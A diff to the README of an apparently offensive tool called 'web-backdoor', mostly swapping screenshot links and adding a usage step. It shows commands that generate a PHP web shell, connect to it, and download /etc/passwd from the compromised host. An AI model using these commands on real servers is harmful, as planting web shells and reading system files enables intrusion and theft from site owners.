@@ -8,13 +8,18 @@
 # generate shell
 <p>  ./web-backdoor.py -g shell
 
-![alt text](https://github.com/cyberheartmi9/web-backdoor/blob/master/screenshoot/WWWEB3.PNG)
+![alt text](https://github.com/cyberheartmi9/web-backdoor/blob/master/screenshoot/WWWEB31.PNG)
 
 # run shell 
 
 <p>  ./web-backdoor.py  -u http://127.0.0.1/shell.php
 
-![alt text](https://github.com/cyberheartmi9/web-backdoor/blob/master/screenshoot/WWWEB2.PNG)
+![alt text](https://github.com/cyberheartmi9/web-backdoor/blob/master/screenshoot/WWWEB32.PNG)
+
+# download file
+<p> download /etc/passwd
+
+![alt text](https://github.com/cyberheartmi9/web-backdoor/blob/master/screenshoot/WWWEB33.PNG)
 
 
                                                                   
